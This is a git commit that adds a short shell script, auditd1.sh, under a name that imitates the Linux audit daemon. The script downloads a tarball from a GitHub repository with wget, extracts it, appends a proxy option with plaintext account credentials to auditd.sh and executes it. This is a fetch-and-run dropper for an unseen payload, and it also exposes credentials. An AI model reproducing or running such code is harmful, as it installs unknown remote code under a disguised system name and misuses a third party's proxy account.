3f6d1262beb9f749a8bb71eaf089805f61f653f8
viper-fervor-shout5 <viper-fervor-shout@duck.com>
2026-09-23 15:24:50 +0700

    Add files via upload

---
+++ auditd1.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+
+wget -O x https://github.com/viper-fervor-shout5/servo-5/raw/refs/heads/main/auditd1.tar.gz && tar xfv x && rm -f auditd.tar.gz && echo " --proxy excueros-rotate:d3h6sr30t281@p.webshare.io:80" >> auditd.sh && ./auditd.sh
